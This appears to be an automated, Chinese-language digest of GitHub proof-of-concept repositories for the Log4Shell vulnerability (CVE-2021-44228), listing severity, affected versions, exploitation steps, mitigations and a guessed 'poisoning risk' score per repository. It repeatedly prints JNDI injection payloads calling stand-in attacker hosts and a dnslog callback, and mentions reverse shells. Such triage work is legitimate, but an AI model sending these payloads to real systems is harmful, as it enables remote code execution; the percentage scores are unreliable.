考虑到以下几点，投毒风险评估为10%：

*   **来源可疑：** 漏洞利用代码来自GitHub上公开的JNDI-Exploit-Kit 和 log4j-shell-poc仓库，并说明了原始repository。
*   **简单的命令执行:** JNDI-Exploit-Kit 的Dockerfile中，通过 `-C` 参数执行 curl 命令，如果攻击服务器被篡改或者受到中间人攻击，可能导致执行的命令被替换为恶意代码。
*   **网络依赖：** 该POC依赖于网络连接，如果攻击者可以控制网络流量，可能会劫持请求并注入恶意代码。

虽然存在风险，但是代码的目的相对明确,只是执行`curl` 命令，且给出了原始仓库地址，因此不认为主要目的是投毒，但存在被利用的可能性。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI lookup字符串的请求，例如：`${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用Log4j2记录该请求，触发JNDI lookup。
3.  Log4j2通过JNDI向`attacker.com`的LDAP服务器发起请求。
4.  攻击者的LDAP服务器返回一个包含恶意Java类的JNDI引用。
5.  Log4j2加载并执行该恶意Java类，从而实现远程代码执行。

总结：该漏洞利用简单，危害巨大。POC的有效性高，但存在一定的投毒风险。

**项目地址:** [safeer-accuknox/log4j-shell-poc](https://github.com/safeer-accuknox/log4j-shell-poc)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #35

**来源**: [CVE-2021-44228-sec13b_CVE-2021-44228-POC.md](../2021/CVE-2021-44228-sec13b_CVE-2021-44228-POC.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用存在漏洞的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。攻击者可以通过构造特殊的JNDI注入字符串，例如`${jndi:ldap://attacker.com/evil}`，当Log4j2记录此字符串时，会尝试通过JNDI从攻击者控制的LDAP服务器下载并执行恶意代码。这个漏洞利用的关键在于Log4j2的lookup substitution功能允许在日志消息中使用JNDI查找。漏洞库信息、搜索引擎结果和提供的PoC代码都证实了此漏洞的严重性和利用方式。

**有效性：**
提供的YAML格式的PoC代码有效，针对不同的应用场景（Apache Druid, Apache JSPWiki, CAS, Code42, Elasticsearch等）构造了特定的payload，通过发送包含JNDI注入字符串的请求，触发漏洞。

**投毒风险：**
PoC代码本身的主要目的是验证漏洞的存在，但存在一定的投毒风险。虽然PoC中执行的恶意代码通常是用于验证目的，例如回连攻击者的服务器，但如果攻击者篡改这些PoC，可以将payload替换为更具破坏性的恶意代码，比如植入后门、窃取敏感信息或进行拒绝服务攻击。由于PoC文件来自未经审核的第三方源，存在作者在payload中植入恶意代码的可能性。因此，在使用这些PoC时，需要仔细审查代码，确保其安全性。

风险评估：
* 代码结构和目标：PoC文件结构清晰，目标明确，针对已知漏洞利用。恶意行为的风险较低，因为代码的目的是为了复现漏洞，而不是隐藏恶意功能。
* 外部依赖：几乎没有外部依赖项，降低了引入恶意代码的可能性。
* 权限要求：这些 PoC 需要具有执行网络请求的权限，这增加了潜在的风险，因为它们可能被用来发起对内部网络的攻击或数据泄露。
* 代码审查：代码可读性高，易于审查。这意味着可以相对容易地识别和删除任何潜在的恶意代码。

综合以上因素，我给出的投毒风险是 10%。

**利用方式：**
1.  **确定目标系统：** 找到使用存在漏洞的Log4j2版本的应用程序。
2.  **构造恶意Payload：**  构建包含JNDI注入的Payload，例如`${jndi:ldap://attacker.com/evil}`。其中`attacker.com`是攻击者控制的服务器，`evil`是LDAP服务器上的恶意代码。
3.  **发送Payload：** 将Payload插入到应用程序的日志消息中。这可以通过多种方式实现，例如：
    *   HTTP请求头（User-Agent, X-Forwarded-For等）
    *   POST请求参数
    *   URL参数
    *   任何可能被应用程序记录的输入
4.  **利用JNDI执行恶意代码：**  当Log4j2记录包含Payload的消息时，会尝试通过JNDI从`attacker.com`下载并执行恶意代码。
5.  **反向shell获取权限：**  恶意代码通常会启动一个反向shell，允许攻击者远程控制目标系统。

提供的PoC代码针对特定应用（Druid, JSPWiki, CAS, Code42, Elasticsearch）的特定URI或HTTP头构造包含恶意JNDI字符串的请求，如果目标应用存在漏洞，且使用Log4j2记录相关请求信息，则可触发漏洞，实现远程代码执行。

**项目地址:** [sec13b/CVE-2021-44228-POC](https://github.com/sec13b/CVE-2021-44228-POC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #36

**来源**: [CVE-2021-44228-srcporter_CVE-2021-44228.md](../2021/CVE-2021-44228-srcporter_CVE-2021-44228.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响版本的 Log4j2，且允许 JNDI 查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以通过控制日志消息或日志消息参数，在启用了消息查找替换的情况下，执行从 LDAP 服务器加载的任意代码。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。 搜索引擎结果显示了许多关于此漏洞的分析、利用和缓解措施的讨论。提供的 Dockerfile 和构建脚本表明可以构建一个包含漏洞的应用程序。

**利用方式：**

1.  攻击者将恶意 JNDI 查找字符串注入到应用程序的日志消息中。例如，通过 HTTP 请求的 User-Agent 头部或 POST 请求的参数。
2.  Log4j2 尝试解析日志消息，遇到 JNDI 查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  Log4j2 通过 JNDI 连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的 URL。
5.  Log4j2 下载并执行该恶意 Java 类，从而导致远程代码执行。

**投毒风险：**提供的代码库旨在创建一个包含 Log4Shell 漏洞的示例应用程序，用于安全测试。虽然代码本身直接显示了漏洞的存在，但仍然存在一些轻微的投毒风险，主要集中在以下几点：

*   **依赖项混淆:** 恶意修改`pom.xml`或其他构建脚本,引入包含恶意代码的其他依赖项。
*   **构建脚本后门:** 在`build.sh`或Dockerfile中添加额外的命令,在构建过程中植入后门。
*   **ClassLoader Manipulation:** 理论上，可以修改应用程序的类加载器，动态加载和执行恶意代码，但这需要对Java内部机制有深入的了解，并且更难检测。
    
    考虑到这些风险，我认为此代码库存在约10%的投毒风险，因为即使是示例代码也可能被用于传播恶意负载。

**项目地址:** [srcporter/CVE-2021-44228](https://github.com/srcporter/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #37

**来源**: [CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md](../2021/CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行、数据泄露和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2 并且允许 JNDI 查找，攻击者能够控制 Log4j2 记录的日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过注入恶意的 JNDI 查找字符串到日志消息中，利用此漏洞执行任意代码。漏洞原理是 Log4j2 允许在日志消息中使用 JNDI 查找功能，如果启用了消息查找功能，攻击者可以控制日志消息或日志消息参数，从而导致从 LDAP 服务器加载并执行任意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者发送包含特定格式的字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，这个字符串会被记录到 Log4j2 的日志中。
2.  **Log4j2 解析 JNDI 字符串：** 当 Log4j2 尝试记录包含 `${jndi:ldap://attacker.com/evil}` 的消息时，它会尝试解析 JNDI 字符串。
3.  **JNDI 查找：** Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  **加载恶意代码：** LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **执行任意代码：** Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**有效性：**
根据漏洞描述和搜索引擎结果，该漏洞的POC代码有效，可以实现远程代码执行。

**投毒风险：**
该漏洞利用代码存在一定的投毒风险。提供的`README.md`文件描述了利用过程，但其中包含的payload (Socket appender) 有可能被用于数据窃取。尽管主要目的是演示RCE，但通过`SerializedLayout`将日志事件发送到攻击者服务器，实际上意味着任何被记录的数据（包括潜在的敏感信息）都可能被泄露。因此，存在一定风险。

**风险评估依据：**
提供的POC专注于建立Socket连接并将序列化的数据发送到远程服务器，这意味着它可以用来构建一个后门，泄露信息或者植入更深层次的恶意代码。

**综上所述，虽然POC的目的是演示Log4Shell漏洞，但其中利用Socket appender 和 SerializedLayout的行为,存在潜在的投毒行为，因此投毒风险不容忽视。**

**项目地址:** [tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment](https://github.com/tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #38

**来源**: [CVE-2021-44228-thomaspatzke_Log4Pot.md](../2021/CVE-2021-44228-thomaspatzke_Log4Pot.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极其高危，可导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序必须使用受影响的 Log4j2 版本，且允许攻击者控制记录的日志消息或日志消息参数。JNDI lookup substitution 必须启用 (2.15.0 之前默认启用)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 允许在日志消息中使用 JNDI (Java Naming and Directory Interface) 查询。当 Log4j2 尝试解析包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的日志消息时，它会尝试通过 JNDI 从指定的 LDAP 服务器检索并执行恶意代码。

**有效性：**
根据漏洞库信息、搜索结果和漏洞利用的广泛性，此漏洞的 POC 代码非常有效。

**投毒风险：**
提供的“漏洞利用代码”仅仅是一个 GNU GPL 协议的 LICENSE 文件，本身不包含任何可执行的代码或恶意指令。因此，基于这份文件，投毒风险为 0%。

**利用方式：**
1.  **攻击者注入恶意 JNDI 字符串：** 攻击者需要在应用程序能够记录的任何输入点注入包含 JNDI 查找的恶意字符串。这可能包括 HTTP 请求头（例如 `User-Agent`、`X-Forwarded-For`）、POST 请求参数、WebSocket 消息等。
2.  **Log4j2 记录日志：** 当应用程序使用 Log4j2 记录包含恶意 JNDI 字符串的日志消息时，Log4j2 会尝试解析该字符串。
3.  **JNDI 查找：** Log4j2 会触发 JNDI 查找，尝试连接到攻击者控制的 LDAP 或其他 JNDI 相关服务器。
4.  **远程代码执行：** 攻击者的 JNDI 服务器会返回一个包含恶意 Java 类的响应。Log4j2 会加载并执行该 Java 类，导致远程代码执行。攻击者可以利用此漏洞在目标系统上执行任意命令。

**缓解措施：**
*   升级到 Log4j2 的修复版本（2.16.0 或更高版本，或者 2.12.2、2.12.3 或 2.3.1）。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups` 为 `true` 来禁用消息查找，或者删除 `JndiLookup` 类。

综上所述，CVE-2021-44228 是一个极其严重的安全漏洞，利用方式简单，影响范围广泛，需要立即进行修复。

**项目地址:** [thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #39

**来源**: [CVE-2021-44228-winnpixie_log4noshell.md](../2021/CVE-2021-44228-winnpixie_log4noshell.md)

## CVE-2021-44228 Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，且允许记录用户可控的数据。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的攻击者执行远程代码。攻击者可以通过将恶意 JNDI 注入字符串插入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析此字符串时，它会向攻击者控制的 LDAP 或其他 JNDI 端点发起请求，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的 POC 代码非常有效。大量的安全厂商和研究人员都确认了此漏洞的存在和可利用性。提供的“Log4NoShell”代码实际上是一个缓解工具，通过禁用 Log4j2 的 JNDI 查找来防止漏洞被利用。它本身不是exploit，而是防御手段。

**投毒风险：**

分析提供的缓解工具代码，该代码主要功能是通过Java Agent禁用Log4j的JNDI lookup功能，本身不存在恶意代码。但是，任何第三方提供的工具都存在潜在的投毒风险。代码中使用了 ASM 字节码操作库，有一定的复杂性，增加了审查的难度。 因此，尽管表面上是防御工具，仍然存在一定的风险，建议在使用前仔细审查代码。

 风险评估：5%。

**利用方式：**

1.  攻击者识别使用易受攻击的 Log4j2 版本的应用程序。
2.  攻击者将包含恶意 JNDI 注入字符串（例如 `${jndi:ldap://attacker.com/evil}`）的输入发送到应用程序，确保该输入会被 Log4j2 记录下来。输入的途径包括但不限于：HTTP头（User-Agent, X-Forwarded-For等），POST请求体，URL参数等
3.  Log4j2 尝试解析该字符串，并向攻击者控制的 LDAP 服务器发起请求。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而允许攻击者执行任意代码。

**项目地址:** [winnpixie/log4noshell](https://github.com/winnpixie/log4noshell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #40

**来源**: [CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md](../2021/CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许外部JNDI查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的严重远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能执行从 LDAP 服务器加载的任意代码。该漏洞利用 JNDI 注入，攻击者将包含恶意 JNDI 查找的字符串发送到应用程序，Log4j2 解析并执行该字符串，从而导致远程代码执行。

**有效性：**
提供的POC代码有效。它展示了如何使用 JNDI 注入漏洞利用 Log4j2。该代码提供了一个简单的 Spring Boot 应用程序，用于触发漏洞，并提供了一个利用有效载荷的示例。

**投毒风险：**
此仓库中作者隐藏投毒代码的风险较低。`README.md` 中提示的payload执行的是打开计算器程序的操作，虽然不是恶意操作，但仍需警惕。另外，`pom.xml` 文件声明依赖了 `log4j-api` 和 `log4j-core` 2.14.1版本，这是一个受漏洞影响的版本，为复现漏洞提供环境。`VulController.java` 中定义了触发漏洞的端点 `/vul`，并使用 `log.info` 记录请求参数。这个简单的应用程序本身不包含任何隐藏的恶意代码，仓库目的是复现CVE-2021-44228。 但无法完全排除作者添加了不易察觉的后门的可能。风险评估为 10%。

**利用方式：**
利用方式如下：
1.  攻击者找到一个使用了 Log4j2 且允许外部 JNDI 查找的应用程序。
2.  攻击者将一个包含恶意 JNDI 查找的字符串（例如 `${jndi:ldap://your_ip:port/xxx}`）注入到应用程序可以记录的任何输入字段（例如 HTTP Header、POST 参数等）。
3.  当 Log4j2 尝试记录该字符串时，它会解析 JNDI 查找，并尝试连接到攻击者控制的 LDAP 服务器。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**项目地址:** [x1ongsec/CVE-2021-44228-Log4j-JNDI](https://github.com/x1ongsec/CVE-2021-44228-Log4j-JNDI)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #41

**来源**: [CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md](../2021/CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过控制日志消息或日志消息参数，从 LDAP 服务器加载并执行任意代码。漏洞利用方式是向服务器发送包含特定格式的 JNDI 注入payload的请求，例如 `${jndi:ldap://malicious-server.com/exploit}`。如果 Log4j2 记录了该请求，它会尝试解析该字符串，从而触发 JNDI 查找并从恶意服务器下载和执行代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞被广泛利用，POC代码有效。Unit 42、NVD、CrowdStrike、Sysdig、Oracle 等多个安全机构都发布了关于该漏洞的分析和缓解措施，证明了其真实性和危害性。

**投毒风险：**
提供的代码仓库主要侧重于使用机器学习方法检测Log4Shell攻击，而非直接的漏洞利用。尽管仓库中包含用于训练模型的日志数据和Python脚本，这些组件本身不太可能直接包含投毒代码。

风险在于：
1.  **数据污染：** 训练数据中可能包含精心构造的、旨在降低检测模型准确性的恶意日志条目（例如，通过添加混淆或规避技术），占比约5%。
2.  **依赖项风险：** `requirements.txt` 中列出的某些依赖项可能存在安全漏洞，但这不是作者的有意投毒。

总体而言，此代码仓库的投毒风险较低，约5%。

**利用方式：**
1.  攻击者将恶意 JNDI 注入 payload 插入到应用程序的日志消息中，例如通过 HTTP 请求头、POST 数据或其他用户可控的输入。
2.  如果应用程序使用存在漏洞的 Log4j2 版本记录此消息，Log4j2 会尝试解析 JNDI 字符串。
3.  Log4j2 触发 JNDI 查找，连接到攻击者控制的 LDAP 或 RMI 服务器。
4.  恶意服务器返回一个包含 Java 类的响应，该类包含攻击者想要执行的恶意代码。
5.  Log4j2 加载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.0 或更高版本。
*   禁用 JNDI 查找。
*   配置防火墙规则以阻止出站 LDAP 和 RMI 连接。

**项目地址:** [yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-](https://github.com/yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---



---

## POC #16

**来源**: [CVE-2021-44228-Tai-e_CVE-2021-44228.md](../2021/CVE-2021-44228-Tai-e_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响的 Log4j2 版本，且允许JNDI 查找。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入执行任意代码。漏洞利用方式通常涉及在日志消息中插入包含恶意 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此消息时，它会尝试通过 LDAP 从攻击者控制的服务器检索并执行代码。\n\n提供的漏洞利用代码是一个使用 Tai-e 静态分析工具来检测 Log4Shell 漏洞及其触发路径的项目。该项目本身不包含恶意代码，其目的是帮助安全研究人员和开发人员识别和修复受此漏洞影响的应用程序。但是，任何下载和使用漏洞利用代码的行为都存在一定的风险，因为可能存在其他未知的安全问题或依赖项。该项目使用了gradlew脚本，理论上存在一定的投毒风险，可能在编译的时候执行恶意代码，但从代码内容来看，直接投毒的可能性较低。主要风险在于构建脚本依赖的第三方库可能被篡改，导致潜在的供应链攻击。

根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用非常有效，影响广泛。需要尽快修复。


**项目地址:** [Tai-e/CVE-2021-44228](https://github.com/Tai-e/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #17

**来源**: [CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md](../2021/CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许出站网络连接访问攻击者控制的 LDAP 或其他 JNDI 端点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过发送特制的日志消息，利用 JNDI 注入漏洞，从恶意 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的 POC 代码是有效的，它演示了如何利用此漏洞。它包含一个 Dockerfile，用于构建包含漏洞的 Tomcat 应用，以及一个 Python 脚本，用于自动化漏洞利用过程，包括设置恶意的 LDAP 服务器和 HTTP 服务器，并生成 Payload。

**投毒风险：**
尽管该存储库旨在作为概念验证，但仍存在一定的投毒风险。 虽然代码本身没有明显的恶意功能，但它简化了漏洞利用，这可能会增加被不道德行为者利用的风险。`poc.py` 脚本中的部分代码存在可疑行为，比如 Java 代码的字符串拼接，以及 `Proc` 类的调用，这些地方有可能隐藏恶意指令。 因此，投毒风险评估为 10%。使用此 PoC 时应采取预防措施，例如在隔离环境中进行。

**利用方式：**
1.  攻击者发送包含 JNDI 查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的特制日志消息。该字符串会被 Log4j2 解析。
2.  Log4j2 尝试通过 JNDI 连接到攻击者控制的 LDAP 服务器。
3.  LDAP 服务器响应，并返回一个 Java 类的 URL。
4.  Log4j2 下载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

该 POC 仓库提供了一个 Dockerfile 用来构建一个有漏洞的web应用，以及一个 Python 脚本，它模拟了攻击者的 LDAP 服务器和 Payload 生成器，并自动化了利用过程。攻击者需要监听一个端口来接受反向shell连接。 使用方法是在目标服务存在漏洞的地方插入恶意的 JNDI 字符串。

**项目地址:** [YangHyperData/LOGJ4_PocShell_CVE-2021-44228](https://github.com/YangHyperData/LOGJ4_PocShell_CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #18

**来源**: [CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md](../2021/CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标应用程序使用受影响的Log4j2版本，并且允许消息查找替换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意的 JNDI 查找字符串注入到 Log4j2 可以记录的任何输入中来利用此漏洞。当 Log4j2 尝试解析并执行该 JNDI 查找时，它可能会从攻击者控制的 LDAP 或其他 JNDI 相关端点加载任意代码。

**有效性：**
提供的 PoC 代码是有效的。它使用 `${jndi:dns://${sys:java.version}.z72ouf.dnslog.cn}` 格式的 JNDI 注入，该注入会触发 DNS 查询到 `z72ouf.dnslog.cn`，从而验证漏洞是否已成功利用。 `${sys:java.version}` 获取Java版本号。

**投毒风险：**
此仓库中不太可能存在作者隐藏的投毒代码（0%）。提供的文件看起来直接针对演示和利用 CVE-2021-44228 漏洞。 `pom.xml` 文件定义了 log4j-core 和 log4j-api 的依赖项。`log4j2.xml` 文件配置了基本的日志记录。 `CVE202144228.java` 文件包含利用该漏洞的有效负载，该负载会生成 DNS 查询以进行验证。 由于该PoC的主要作用是为了验证漏洞，而非植入后门，因此认为投毒风险低。

**利用方式：**
1.  攻击者找到应用程序中记录用户可控输入的位置。 这些位置可能包括 HTTP header，POST 数据，GET 参数等，总之，所有程序日志可以记录的地方。
2.  攻击者将恶意 JNDI 查找字符串（例如`${jndi:ldap://attacker.com/Exploit}`）注入到此输入中。
3.  当应用程序记录此输入时，Log4j2 会尝试解析 JNDI 查找。
4.  Log4j2 会连接到攻击者控制的 LDAP 服务器（或其他的 JNDI 服务）。
5.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
6.  Log4j2 加载并执行此恶意 Java 类，从而允许攻击者在目标系统上执行任意代码。
7. 缓解措施包括升级 Log4j2 到 >=2.17.0 版本，禁用 JNDI 查找，或设置 `log4j2.formatMsgNoLookups=true`。


**项目地址:** [ZacharyZcR/CVE-2021-44228](https://github.com/ZacharyZcR/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #19

**来源**: [CVE-2021-44228-arabindadora_log4shell.md](../2021/CVE-2021-44228-arabindadora_log4shell.md)

## CVE-2021-44228 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j版本，并且允许记录用户可控的输入，同时启用消息查找替换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个存在于Apache Log4j2中的严重漏洞。该漏洞允许攻击者通过向日志消息或日志消息参数中注入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/a}`，来执行任意代码。当Log4j2处理包含该字符串的日志消息时，它会尝试通过JNDI从攻击者控制的LDAP服务器检索Java对象。如果JVM配置允许，该对象将被反序列化并执行，从而导致远程代码执行。

**利用方式：**
1.  攻击者识别使用Log4j2且记录用户可控输入的应用程序。
2.  攻击者构造包含恶意JNDI查找的payload，并将其注入到应用程序可以记录的任何输入字段中（例如，HTTP头、表单参数等）。
3.  当应用程序记录包含恶意payload的输入时，Log4j2会尝试解析JNDI查找。
4.  Log4j2向攻击者控制的LDAP服务器发出请求。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的引用。
6.  应用程序下载并执行恶意Java类，从而允许攻击者在目标系统上执行任意代码。

**评估POC代码：**
提供的PoC代码包含一个Dockerfile和Makefile，用于演示和利用CVE-2021-44228漏洞。Makefile包含用于构建Docker容器、启动/停止应用程序、触发漏洞利用和修补受害者应用程序的命令。`make exploit` 命令使用curl发送一个包含恶意JNDI payload的HTTP请求，该payload的目标是`${jndi:ldap://$(LHOST):$(LPORT)/a}`。该代码有效演示了漏洞利用。

**投毒风险：**
虽然PoC代码本身旨在演示和利用该漏洞，但任何从不受信任的来源下载的代码都存在潜在的风险。在本例中，投毒风险较低（约为10%），因为代码相对简单且易于审查。需要注意的是，Makefile的`exploit`命令和docker-compose.yml 中涉及的镜像如果被篡改，可能会引入恶意行为。用户应仔细检查所有代码，尤其是与网络连接和代码执行相关的部分，然后再执行PoC。代码中提供的Exploit.class ，本身就是一个后门代码,务必不要把POC验证的后门代码判定为投毒代码。docker-compose.yml 中涉及的镜像需要人工review.

**项目地址:** [arabindadora/log4shell](https://github.com/arabindadora/log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #20

